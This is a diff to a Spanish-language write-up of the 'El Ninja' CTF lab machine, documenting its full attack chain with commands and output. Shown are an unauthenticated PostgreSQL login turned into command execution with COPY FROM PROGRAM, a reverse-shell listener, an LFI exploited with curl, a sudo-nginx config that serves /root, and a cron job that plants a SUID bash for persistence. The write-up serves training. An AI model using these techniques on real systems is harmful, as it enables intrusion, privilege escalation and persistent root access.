@@ -15,7 +15,7 @@ dificultad: "avanzado"
 
 La máquina El Ninja de TheHackersLabs combina una superficie de ataque amplia — cinco servicios expuestos, entre ellos una API en FastAPI, una aplicación Flask y un servicio Python a medida — con una cadena de explotación que en la práctica pivota sobre un único fallo grave: PostgreSQL accesible sin autenticación real. A partir de ahí, la filtración de credenciales en un fichero de configuración PHP permite el salto al usuario del sistema, y una regla `sudo` sobre `nginx` sin restricción de configuración habilita la lectura arbitraria de `/root` y, posteriormente, la escritura arbitraria mediante WebDAV para desplegar persistencia.
 
-IP objetivo: `10.0.2.5`. IP atacante: `10.0.2.3`. Las flags se muestran parcialmente censuradas para no facilitar la resolución directa a terceros; el objetivo de este artículo es documentar la metodología, no las respuestas.
+IP objetivo: `10.0.2.5`. IP atacante: `10.0.2.3`. Las flags y las contraseñas del sistema se muestran parcialmente censuradas para no facilitar la resolución directa a terceros; el objetivo de este artículo es documentar la metodología, no las respuestas.
 
 ## Reconocimiento — Descubrimiento de host
 
@@ -23,31 +23,81 @@ El primer paso es identificar los hosts activos en el segmento de red del labora
 
 <pre class="term-log">
 <span class="cmd">$ nmap -sP 10.0.2.0/24</span>
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-12 09:54 +0200
+Nmap scan report for 10.0.2.1
+Host is up (0.00021s latency).
+MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
+Nmap scan report for 10.0.2.2
+Host is up (0.00014s latency).
+MAC Address: 08:00:27:80:EC:C0 (Oracle VirtualBox virtual NIC)
+<span class="hl">Nmap scan report for 10.0.2.5</span>
+<span class="hl">Host is up (0.0055s latency).</span>
+<span class="hl">MAC Address: 08:00:27:9B:67:FF (Oracle VirtualBox virtual NIC)</span>
+Nmap scan report for 10.0.2.3
+Host is up.
+Nmap done: 256 IP addresses (4 hosts up) scanned in 11.19 seconds
 </pre>
 
 El barrido localiza cuatro hosts activos: `10.0.2.1` (gateway QEMU), `10.0.2.2` (NAT de VirtualBox), `10.0.2.3` (equipo atacante) y `10.0.2.5` (objetivo, MAC `08:00:27:9B:67:FF`, adaptador Oracle VirtualBox).
 
 ## Reconocimiento — Escaneo de puertos
 
-Un primer intento de escaneo completo forzando una tasa de envío alta produjo resultados poco fiables:
-
-<pre class="term-log">
-<span class="cmd">$ nmap -A -sSV -p- --open --min-rate 5000 -n -Pn 10.0.2.5</span>
-<span class="hl">Warning: RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span>
-[...]
-</pre>
-
-Los avisos repetidos de `RTTVAR` y un número anómalamente alto de puertos marcados como `filtered` en lugar de `closed` son síntoma de pérdida de paquetes: `--min-rate 5000` fuerza un ritmo de envío que la latencia real del entorno virtualizado (en torno a 100 ms) no sostiene sin descartar respuestas. Se repite el escaneo sin forzar la tasa, dejando que Nmap autorregule el envío según el RTT observado:
+Con el host localizado, se lanza un escaneo completo de puertos con detección de servicio y sistema operativo:
 
 <pre class="term-log">
 <span class="cmd">$ nmap -A -sSV -p- --open -n -Pn 10.0.2.5</span>
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-12 09:58 +0200
+Nmap scan report for 10.0.2.5
+Host is up (0.065s latency).
+Not shown: 65529 closed tcp ports (reset)
 PORT     STATE SERVICE    VERSION
 <span class="hl">22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)</span>
-<span class="hl">80/tcp   open  http       nginx 1.22.1 (Apache2 Debian Default Page)</span>
+| ssh-hostkey:
+|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
+|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
+<span class="hl">80/tcp   open  http       nginx 1.22.1</span>
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: nginx/1.22.1
 <span class="hl">1337/tcp open  http       Uvicorn</span>
-<span class="hl">5000/tcp open  http       Werkzeug httpd 3.1.8 (Python 3.11.2) — "THL Ninjas"</span>
+|_http-server-header: uvicorn
+|_http-title: Site doesn't have a title (application/json).
+<span class="hl">5000/tcp open  http       Werkzeug httpd 3.1.8 (Python 3.11.2)</span>
+|_http-server-header: Werkzeug/3.1.8 Python/3.11.2
+|_http-title: THL Ninjas — Precision. Silencio. Ejecucion....
 <span class="hl">5432/tcp open  postgresql PostgreSQL DB 15.15 - 15.16</span>
-<span class="hl">9999/tcp open  abyss?     servicio custom en Python (/home/wvverez/server.py)</span>
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=debian
+| Subject Alternative Name: DNS:debian
+| Not valid before: 2024-10-16T11:07:27
+|_Not valid after:  2034-10-14T11:07:27
+<span class="hl">9999/tcp open  abyss?</span>
+| fingerprint-strings:
+|   NULL:
+|     [+] Username:
+|   GetRequest, HTTPOptions, GenericLines:
+|     [+] Username: [+] Password:
+|     Login Failed
+|   RPCCheck, SSLSessionReq, TerminalServerCookie:
+|     [+] Username: Traceback (most recent call last):
+|       File "/home/wvverez/server.py", line 33, in
+|         handle()
+|       File "/home/wvverez/server.py", line 13, in handle
+|         user = sys.stdin.readline().strip()
+|       File "&lt;frozen codecs&gt;", line 322, in decode
+|_    UnicodeDecodeError: 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte
+1 service unrecognized despite returning data.
+MAC Address: 08:00:27:9B:67:FF (Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   64.58 ms 10.0.2.5
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 140.47 seconds
 </pre>
 
 **Desglose de parámetros:**
@@ -80,8 +130,9 @@ Con el puerto 5432 abierto, se prueba el acceso con el rol por defecto `postgres
 
 <pre class="term-log">
 <span class="cmd">$ psql -h 10.0.2.5 -U postgres -w</span>
-psql (15.x)
-Type "help" for help.
+psql (18.4 (Debian 18.4-1+b2), servidor 15.16 (Debian 15.16-0+deb12u1))
+Conexión SSL (protocolo: TLSv1.3, cifrado: TLS_AES_256_GCM_SHA384, compresión: desactivado, ALPN: ninguno)
+Digite «help» para obtener ayuda.
 
 postgres=#
 </pre>
@@ -96,18 +147,28 @@ La conexión se acepta sin ninguna contraseña, confirmando que `pg_hba.conf` en
 
 <pre class="term-log">
 <span class="cmd">postgres=# \l</span>
-<span class="hl">postgres           | postgres</span>
-template0          | postgres
-template1          | postgres
-<span class="hl">thlninjas_internal | superadmin</span>
+                                    Listado de base de datos
+       Nombre       |   Dueño    | Codificación | Collate     | Ctype       | Privilegios
+--------------------+------------+--------------+-------------+-------------+---------------------------
+<span class="hl">postgres           | postgres   | UTF8         | es_ES.UTF-8 | es_ES.UTF-8 |</span>
+ template0          | postgres   | UTF8         | es_ES.UTF-8 | es_ES.UTF-8 | =c/postgres +
+                     |            |              |             |             | postgres=CTc/postgres
+ template1          | postgres   | UTF8         | es_ES.UTF-8 | es_ES.UTF-8 | =c/postgres +
+                     |            |              |             |             | postgres=CTc/postgres
+<span class="hl">thlninjas_internal | superadmin | UTF8         | es_ES.UTF-8 | es_ES.UTF-8 | =Tc/superadmin +</span>
+                     |            |              |             |             | superadmin=CTc/superadmin
+(4 filas)
 </pre>
 
 ### Verificación de privilegios
 
 <pre class="term-log">
 <span class="cmd">postgres=# \du</span>
-<span class="hl">postgres   | Superusuario, Crear rol, Crear BD, Replicación, Ignora RLS</span>
-<span class="hl">superadmin | Superusuario</span>
+                              Listado de roles
+ Nombre de rol | Atributos
+---------------+------------------------------------------------------------
+<span class="hl">postgres      | Superusuario, Crear rol, Crear BD, Replicación, Ignora RLS</span>
+<span class="hl">superadmin    | Superusuario</span>
 </pre>
 
 Ambos roles disponibles tienen atributo `Superusuario`. En PostgreSQL, un rol superusuario puede invocar la función `COPY ... FROM/TO PROGRAM`, que ejecuta un comando del sistema operativo y redirige su entrada o salida hacia la tabla. Esto convierte cualquier acceso con privilegios de superusuario en ejecución remota de comandos (RCE) directa, sin necesidad de extensiones adicionales como `plpgsql` con funciones inseguras.
@@ -118,7 +179,12 @@ Ambos roles disponibles tienen atributo `Superusuario`. En PostgreSQL, un rol su
 <span class="cmd">postgres=# CREATE TEMP TABLE result(result text);</span>
 <span class="cmd">postgres=# COPY result FROM PROGRAM 'id';</span>
 <span class="cmd">postgres=# SELECT * FROM result;</span>
+CREATE TABLE
+COPY 1
+                       result
+------------------------------------------------------
 <span class="hl">uid=104(postgres) gid=112(postgres) grupos=112(postgres),109(ssl-cert)</span>
+(1 fila)
 </pre>
 
 El resultado confirma ejecución de comandos como el usuario de sistema `postgres`, con grupo secundario `ssl-cert`.
@@ -128,7 +194,7 @@ El resultado confirma ejecución de comandos como el usuario de sistema `postgre
 Se levanta un listener en la máquina atacante:
 
 <pre class="term-log">
-<span class="cmd">$ nc -nlvp 443</span>
+<span class="cmd">$ nc -lnvp 443</span>
 listening on [any] 443 ...
 </pre>
 
@@ -142,8 +208,9 @@ Shell recibida en el listener, como usuario `postgres` y sin TTY completo:
 
 <pre class="term-log">
 <span class="hl-green">connect to [10.0.2.3] from (UNKNOWN) [10.0.2.5] 42288</span>
-bash: no se puede establecer el grupo de proceso de terminal
+bash: no se puede establecer el grupo de proceso de terminal (1068): Función ioctl no apropiada para el dispositivo
 bash: no hay control de trabajos en este shell
+postgres@TheHackersLabs-ElNinja:/var/lib/postgresql/15/main$
 </pre>
 
 ### Tratamiento de la shell (TTY upgrade)
@@ -151,6 +218,8 @@ bash: no hay control de trabajos en este shell
 Antes de continuar la enumeración se estabiliza la sesión con el método clásico de PTY spawning:
 
 <pre class="term-log">
+<span class="cmd">$ which python3</span>
+/usr/bin/python3
 <span class="cmd">$ python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
 <span class="cmd"># Ctrl+Z</span>
 <span class="cmd">$ stty raw -echo; fg</span>
@@ -173,11 +242,15 @@ Antes de continuar la enumeración se estabiliza la sesión con el método clás
 
 <pre class="term-log">
 <span class="cmd">$ ls -la /opt</span>
+total 12
+drwxr-xr-x  2 root root 4096 Apr 28 18:36 .
+drwxr-xr-x 18 root root 4096 Oct 16  2024 ..
+-rw-r--r--  1 root root  111 Apr 28 18:36 db.php
 <span class="cmd">$ cat /opt/db.php</span>
 &lt;?php
 $db_credentials = [
     'username' => 'wvverez',
-    <span class="hl">'password' => 'dun1bd12dh979d178gd5%djnashda'</span>
+    <span class="hl">'password' => 'dun1bd1...djnashda'</span>
 ];
 ?&gt;
 </pre>
@@ -188,49 +261,324 @@ El fichero tiene propietario `root:root` y permisos `644` (lectura global) — u
 
 <pre class="term-log">
 <span class="cmd">$ su wvverez</span>
+Contraseña:
 <span class="cmd">$ id && whoami</span>
 <span class="hl">uid=1001(wvverez) gid=1001(wvverez) grupos=1001(wvverez),100(users)</span>
+wvverez
 </pre>
 
 ### Flag de usuario
 
 <pre class="term-log">
 <span class="cmd">$ cd ~ &amp;&amp; ls -la</span>
+total 56
+drwx------  5 wvverez wvverez 4096 Apr 28 18:51 .
+drwxr-xr-x  3 root    root    4096 Apr 28 17:19 ..
+-rw-r--r--  1 wvverez wvverez 1955 Apr 28 14:34 api.py
+-rw-r--r--  1 wvverez wvverez 3065 Apr 28 15:43 app.py
+lrwxrwxrwx  1 root    root       9 Apr 28 18:49 .bash_history -> /dev/null
+-rwxr-xr-x  1 wvverez wvverez 1076 Apr 28 16:15 config.py
+-rwxr-xr-x  1 wvverez wvverez 1010 Apr 28 15:58 db.json
+drwxr-xr-x  3 wvverez wvverez 4096 Apr 28 16:15 ninja_web
+drwxr-xr-x  2 wvverez wvverez 4096 Apr 28 16:15 __pycache__
+-rwxr-xr-x  1 wvverez wvverez  882 Apr 28 12:33 server.py
+drwxr-xr-x  2 wvverez wvverez 4096 Apr 28 16:32 templates
+-rw-r--r--  1 root    root      38 Apr 28 18:51 user.txt
 <span class="cmd">$ cat user.txt</span>
-<span class="hl-green">THL{HjdjadajndlldiuiubnioTHLSDAHDAPO}</span>
+<span class="hl-green">THL{Hjdjad...adaPO}</span>
 </pre>
 
 El directorio personal de `wvverez` contiene la estructura completa de una aplicación: `api.py` (FastAPI/Uvicorn, puerto 1337), `app.py` (Flask, puerto 5000), `config.py`, `db.json`, `server.py` (el servicio del puerto 9999) y los directorios `ninja_web` y `templates`.
 
 ## Análisis de código — hallazgos adicionales
 
-Estos hallazgos se documentan por su valor como evidencia de exposición de datos, pero no forman parte de la vía de escalada de privilegios finalmente explotada.
+Estos hallazgos se documentan por su valor como evidencia de exposición de datos, pero no forman parte de la vía de escalada de privilegios finalmente explotada. Las credenciales de aplicación que aparecen en los ficheros siguientes se muestran también censuradas, siguiendo el mismo criterio aplicado a las contraseñas del sistema.
 
-### LFI en app.py (Flask, puerto 5000)
-
-`config.py` define `FILES_BASE = "/"`, usada en `app.py` dentro del endpoint `/dashboard?list=<path>` sin sanitización del parámetro `filename`:
+### config.py
 
 <pre class="term-log">
-filepath = os.path.join(FILES_BASE, filename)
-with open(filepath, "r", errors="replace") as f:
-    file_content = f.read()
+<span class="cmd">$ cat config.py</span>
+import json
+import os
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DB_PATH = os.path.join(BASE_DIR, "db.json")
+
+def load_db():
+    with open(DB_PATH, "r") as f:
+        return json.load(f)
+
+def save_db(data):
+    with open(DB_PATH, "w") as f:
+        json.dump(data, f, indent=2)
+
+def get_user(username):
+    db = load_db()
+    for user in db["users"]:
+        if user["username"] == username:
+            return user
+    return None
+
+def verify_credentials(username, password):
+    user = get_user(username)
+    if user and user["password"] == password:
+        return user
+    return None
+
+def get_tasks():
+    db = load_db()
+    return db.get("tasks", [])
+
+def add_bug_report(report):
+    db = load_db()
+    db["bug_reports"].append(report)
+    save_db(db)
+
+def get_site_info():
+    db = load_db()
+    return db.get("site", {})
+
+<span class="hl">SECRET_KEY = "thl_n1nj...3_x9z"</span>
+<span class="hl">FILES_BASE = "/"</span>
+
+class Config:
+    SECRET_KEY = os.environ.get('SECRET_KEY') or 'dev-secret-key'
+    PORT = int(os.environ.get('PORT', 5000))
+    HOST = os.environ.get('HOST', '0.0.0.0')
 </pre>
 
-Esto constituye un arbitrary file read (LFI) confirmado a nivel de código fuente, alcanzable tras autenticarse con cualquier credencial válida de la aplicación (se usó `harry`, extraída de `db.json`, con rol `admin`).
+La constante `FILES_BASE = "/"` es la raíz del arbitrary file read documentado más abajo: cualquier ruta pasada al parámetro `list` del dashboard se concatena directamente contra la raíz del sistema de ficheros.
+
+### db.json
+
+<pre class="term-log">
+<span class="cmd">$ cat db.json</span>
+{
+  "users": [
+    {
+      "id": 1,
+      "username": "harry",
+      <span class="hl">"password": "th3THLn...3%cret!"</span>,
+      "role": "admin",
+      "display_name": "Harry Blackwood",
+      "email": "h.blackwood@thlninjas.io"
+    }
+  ],
+  "database": {
+    "engine": "postgresql",
+    "name": "thlninjas_internal",
+    "username": "superadmin",
+    <span class="hl">"password": "THLDKJN...11edd0"</span>,
+    "connection_string": "psql -h (IP) -U superadmin thlninjas_internal",
+    "note": "Production DB — do not share"
+  },
+  "bug_reports": [
+    {
+      "id": "20260428135826",
+      "name": "wvverez",
+      "email": "wvverez@gmail.com",
+      "severity": "critical",
+      "description": "www\r\n",
+      "timestamp": "2026-04-28T13:58:26.937001"
+    }
+  ],
+  "tasks": [
+    "Review Q3 infiltration reports",
+    "Update field agent credentials",
+    "Schedule debrief with Sector 7",
+    "Audit internal network access logs"
+  ],
+  "site": {
+    "name": "THL Ninjas",
+    "tagline": "Precision. Silence. Execution."
+  }
+}
+</pre>
+
+La credencial `harry` es la utilizada más adelante para autenticarse en la aplicación Flask y confirmar el LFI. El bloque `database` filtra además la contraseña real de `superadmin` sobre la base `thlninjas_internal`, la misma base ya alcanzada directamente por `trust` en PostgreSQL.
+
+### api.py — credenciales de la API interna
+
+<pre class="term-log">
+<span class="cmd">$ cat api.py</span>
+from fastapi import FastAPI, HTTPException, Header, Query
+from typing import Optional
+import uvicorn
+
+app = FastAPI()
+
+# Credenciales válidas para acceder a la API
+API_USERS = {
+    <span class="hl">"jerry": "Meg4SUp...!dthl"</span>
+}
+
+# Base de datos interna (contenido del CTF)
+INTERNAL_USERS = [
+    {"id": 1, "username": "harry",   "password": "th3THLn...3%cret!",    "role": "user"},
+    <span class="hl">{"id": 2, "username": "wvverez", "password": "4lBus_P...!Wulf",     "role": "user"}</span>,
+    {"id": 3, "username": "loxy",    "password": "Gr4ng3r...BkM4g1c!",   "role": "user"},
+    {"id": 4, "username": "d4re",    "password": "W34sl3y...ckl3s#99",   "role": "user"},
+    {"id": 5, "username": "ninxa",   "password": "Slyth3r...M4lf0y",     "role": "user"},
+    {"id": 6, "username": "pepe",    "password": "S3v3rus...ns#D4rk",    "role": "user"},
+    {"id": 7, "username": "luis",    "password": "Bl4ckD0...zkab4n!",    "role": "user"},
+    {"id": 8, "username": "lenam",   "password": "H3Wh0Mu...%B3Nam3d",   "role": "userx"},
+]
+
+def verify_auth(x_api_key: str):
+    valid_keys = [f"{u}:{p}" for u, p in API_USERS.items()]
+    if x_api_key not in valid_keys:
+        raise HTTPException(status_code=401, detail="Unauthorized")
+
+@app.get("/api/v1/internal/search")
+def search(q: Optional[str] = Query(default=""), x_api_key: str = Header(...)):
+    verify_auth(x_api_key)
+    results = INTERNAL_USERS
+    if q:
+        results = [u for u in results if q.lower() in str(u).lower()]
+    return {"query": q, "results": results, "count": len(results)}
+
+@app.get("/api/v1/internal/users/{user_id}")
+def get_user(user_id: int, x_api_key: str = Header(...)):
+    verify_auth(x_api_key)
+    user = next((u for u in INTERNAL_USERS if u["id"] == user_id), None)
+    if not user:
+        raise HTTPException(status_code=404, detail="User not found")
+    return user
+
+if __name__ == "__main__":
+    uvicorn.run(app, host="0.0.0.0", port=1337)
+</pre>
+
+El fichero expone en texto plano ocho pares de credenciales (`INTERNAL_USERS`) y una API key estática para el servicio FastAPI del puerto 1337. Ninguna de estas credenciales resultó válida para autenticación de sistema (`sudo`/PAM); son datos exclusivos de la capa de aplicación, incluida la de `wvverez` listada aquí, que es distinta de la contraseña real de sistema filtrada en `/opt/db.php`.
+
+### app.py — LFI en el endpoint /dashboard
+
+<pre class="term-log">
+<span class="cmd">$ cat app.py</span>
+from flask import Flask, render_template, request, redirect, url_for, session, jsonify
+import os
+import datetime
+from config import Config, SECRET_KEY, get_site_info, verify_credentials, get_tasks, add_bug_report, FILES_BASE
+
+app = Flask(__name__)
+app.secret_key = SECRET_KEY
+
+@app.route("/")
+def index():
+    site = get_site_info()
+    return render_template("index.html", site=site)
+
+@app.route("/about")
+def about():
+    site = get_site_info()
+    return render_template("about.html", site=site)
+
+@app.route("/services")
+def services():
+    site = get_site_info()
+    return render_template("services.html", site=site)
+
+@app.route("/login", methods=["GET", "POST"])
+def login():
+    error = None
+    if request.method == "POST":
+        username = request.form.get("username", "")
+        password = request.form.get("password", "")
+        user = verify_credentials(username, password)
+        if user:
+            session["user"] = user["username"]
+            session["display_name"] = user["display_name"]
+            session["role"] = user["role"]
+            return redirect(url_for("dashboard"))
+        else:
+            error = "Invalid credentials."
+    site = get_site_info()
+    return render_template("login.html", site=site, error=error)
+
+@app.route("/logout")
+def logout():
+    session.clear()
+    return redirect(url_for("index"))
+
+@app.route("/dashboard")
+def dashboard():
+    if "user" not in session:
+        return redirect(url_for("login"))
+    tasks = get_tasks()
+    site = get_site_info()
+    file_content = None
+    filename = request.args.get("list", None)
+
+    if filename:
+        try:
+            <span class="hl">filepath = os.path.join(FILES_BASE, filename)</span>
+            <span class="hl">with open(filepath, "r", errors="replace") as f:</span>
+                <span class="hl">file_content = f.read()</span>
+        except FileNotFoundError:
+            file_content = f"[ERROR] File not found: {filename}"
+        except PermissionError:
+            file_content = f"[ERROR] Permission denied: {filename}"
+        except Exception as e:
+            file_content = f"[ERROR] {str(e)}"
+
+    return render_template(
+        "dashboard.html",
+        site=site,
+        tasks=tasks,
+        file_content=file_content,
+        filename=filename,
+        display_name=session.get("display_name"),
+        role=session.get("role"),
+    )
+
+@app.route("/report", methods=["GET", "POST"])
+def report():
+    site = get_site_info()
+    submitted = False
+    if request.method == "POST":
+        report_data = {
+            "id": datetime.datetime.utcnow().strftime("%Y%m%d%H%M%S"),
+            "name": request.form.get("name", "Anonymous"),
+            "email": request.form.get("email", ""),
+            "severity": request.form.get("severity", "low"),
+            "description": request.form.get("description", ""),
+            "timestamp": datetime.datetime.utcnow().isoformat()
+        }
+        add_bug_report(report_data)
+        submitted = True
+    return render_template("report.html", site=site, submitted=submitted)
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=False)
+</pre>
+
+El endpoint `/dashboard` concatena `FILES_BASE` (`"/"`) con el parámetro `list` sin sanitización alguna, confirmando el arbitrary file read (LFI) a nivel de código fuente. Es alcanzable tras autenticarse con cualquier credencial válida de la aplicación — se usó `harry`, extraída de `db.json`, con rol `admin`.
 
 ### Prueba del LFI
 
 <pre class="term-log">
-<span class="cmd">$ curl -s -c cookies.txt -X POST http://10.0.2.5:5000/login -d "username=harry&amp;password=th3THLninj4p4sss3%cret!"</span>
+<span class="cmd">$ curl -s -c cookies.txt -X POST http://10.0.2.5:5000/login -d "username=harry&amp;password=th3THLn...3%cret!"</span>
 <span class="cmd">$ curl -s -b cookies.txt "http://10.0.2.5:5000/dashboard?list=root/root.txt"</span>
 <span class="hl">[ERROR] Permission denied: root/root.txt.</span>
 </pre>
 
 El LFI es funcional a nivel de aplicación, pero el proceso Flask se ejecuta con permisos de un usuario normal, no de root, por lo que no puede leer `/root/root.txt` directamente. Se descarta como vía directa a la flag de root, aunque queda documentado como hallazgo válido de la aplicación web.
 
-### api.py — credenciales de la API interna
+### Fingerprint del sistema operativo
 
-Expone en texto plano ocho pares de credenciales (`INTERNAL_USERS`) y una API key estática (`jerry:Meg4SUp3rPassw$%!dthl`) para el servicio FastAPI del puerto 1337. Ninguna de estas credenciales resultó válida para autenticación de sistema (`sudo`/PAM); son datos exclusivos de la capa de aplicación.
+Con acceso completo a la shell de `wvverez`, se confirma la versión exacta de kernel y distribución, descartando el ruido del fingerprint remoto de Nmap:
+
+<pre class="term-log">
+<span class="cmd">$ uname -a</span>
+<span class="hl">Linux TheHackersLabs-ElNinja 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 GNU/Linux</span>
+<span class="cmd">$ cat /etc/os-release</span>
+PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
+NAME="Debian GNU/Linux"
+VERSION_ID="12"
+VERSION="12 (bookworm)"
+VERSION_CODENAME=bookworm
+ID=debian
+</pre>
 
 ## Escalada de privilegios — wvverez → root
 
@@ -238,25 +586,63 @@ Expone en texto plano ocho pares de credenciales (`INTERNAL_USERS`) y una API ke
 
 <pre class="term-log">
 <span class="cmd">$ sudo -l</span>
+sudo: unable to resolve host TheHackersLabs-ElNinja: Nombre o servicio desconocido
+Matching Defaults entries for wvverez on TheHackersLabs-ElNinja:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
+    use_pty
 <span class="hl">User wvverez may run the following commands on TheHackersLabs-ElNinja:</span>
 <span class="hl">    (root) NOPASSWD: /usr/sbin/nginx</span>
 </pre>
 
-Se confirma además que la restricción es exacta y sin excepciones: cualquier otro comando (`sudo kill`, etc.) es rechazado explícitamente por `sudoers`.
+El aviso "unable to resolve host" es un efecto habitual de `/etc/hosts` mal configurado en el laboratorio; no afecta a la resolución de la regla `sudoers`. Se confirma además que la restricción es exacta y sin excepciones: cualquier otro comando (`sudo kill`, etc.) es rechazado explícitamente.
 
 ### Binarios SUID
 
 <pre class="term-log">
 <span class="cmd">$ find / -perm -4000 -type f 2>/dev/null</span>
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
 </pre>
 
-Únicamente binarios estándar del sistema (`su`, `sudo`, `passwd`, `mount`, etc.), sin hallazgos adicionales explotables.
+Únicamente binarios estándar del sistema, sin hallazgos adicionales explotables.
 
 ### Explotación de sudo sobre nginx
 
-`nginx` ejecutable como root sin restricción sobre el fichero de configuración es un vector de escalada bien conocido: al permitir especificar un `-c` arbitrario, el atacante controla completamente el comportamiento del proceso, incluido el propietario efectivo del worker. Se construye una configuración que sirve el contenido de `/root/` con listado de directorio habilitado:
+`nginx` ejecutable como root sin restricción sobre el fichero de configuración es un vector de escalada bien conocido: al permitir especificar un `-c` arbitrario, el atacante controla completamente el comportamiento del proceso, incluido el propietario efectivo del worker. Un primer intento sin la directiva `user root;` deja el worker corriendo como `nobody`:
 
 <pre class="term-log">
+<span class="cmd">$ nano /tmp/evil_nginx.conf</span>
+<span class="cmd">$ cat /tmp/evil_nginx.conf</span>
+worker_processes 1;
+pid /tmp/nginx_evil.pid;
+error_log /tmp/nginx_evil_error.log;
+events { worker_connections 1024; }
+http {
+  server {
+    listen 8888;
+    location / {
+      root /root/;
+      autoindex on;
+    }
+  }
+}
+</pre>
+
+Al carecer de la directiva `user root;`, el worker se ejecuta como `nobody`, insuficiente para atravesar el directorio `/root` (permisos restrictivos tipo `700`), resultando en `403 Forbidden`. Se corrige añadiendo `user root;` al contexto principal del fichero:
+
+<pre class="term-log">
+<span class="cmd">$ nano /tmp/evil_nginx.conf</span>
+<span class="cmd">$ cat /tmp/evil_nginx.conf</span>
 user root;
 worker_processes 1;
 pid /tmp/nginx_evil2.pid;
@@ -275,7 +661,6 @@ http {
 
 **Notas del proceso de depuración:**
 
-- Un primer intento sin la directiva `user root;` dejó el worker corriendo como `nobody`, insuficiente para atravesar el directorio `/root` (permisos restrictivos tipo `700`), resultando en `403 Forbidden`.
 - Colocar `user root;` dentro del bloque `http {}` provocó el error de sintaxis `"user" directive is not allowed here`, ya que esa directiva solo es válida en el contexto principal (`main`), junto a `worker_processes`/`pid`/`error_log`.
 - Tras mover `user root;` al contexto global, el worker pasó a ejecutar como root y el listado de `/root/` quedó accesible.
 
@@ -291,7 +676,7 @@ Index of /
 
 <pre class="term-log">
 <span class="cmd">$ curl -s http://127.0.0.1:8889/root.txt</span>
-<span class="hl-green">THL{DdahdjbasdbaRHGL}</span>
+<span class="hl-green">THL{Ddahdj...aRHGL}</span>
 </pre>
 
 ## Post-explotación — persistencia como demostración de laboratorio
@@ -301,6 +686,8 @@ Con el objetivo del CTF ya cumplido, se realiza una demostración adicional y co
 ### Servidor de escritura sobre /etc/cron.d/
 
 <pre class="term-log">
+<span class="cmd">$ nano /tmp/evil_nginx_cron.conf</span>
+<span class="cmd">$ cat /tmp/evil_nginx_cron.conf</span>
 user root;
 worker_processes 1;
 pid /tmp/nginx_cron.pid;
@@ -334,6 +721,8 @@ http {
 Job de cron minimalista y observable, que regenera un binario bash con SUID cada minuto:
 
 <pre class="term-log">
+<span class="cmd">$ nano /tmp/sysupdate</span>
+<span class="cmd">$ cat /tmp/sysupdate</span>
 * * * * * root cp /bin/bash /tmp/rootbash &amp;&amp; chmod 4755 /tmp/rootbash
 </pre>
 
@@ -350,8 +739,7 @@ Job de cron minimalista y observable, que regenera un binario bash con SUID cada
 
 <pre class="term-log">
 <span class="cmd">$ /tmp/rootbash -p</span>
-<span class="cmd">$ id</span>
-<span class="cmd">$ whoami</span>
+<span class="cmd">$ id &amp;&amp; whoami</span>
 <span class="hl-green">uid=1001(wvverez) gid=1001(wvverez) euid=0(root) grupos=1001(wvverez),100(users)</span>
 root
 </pre>
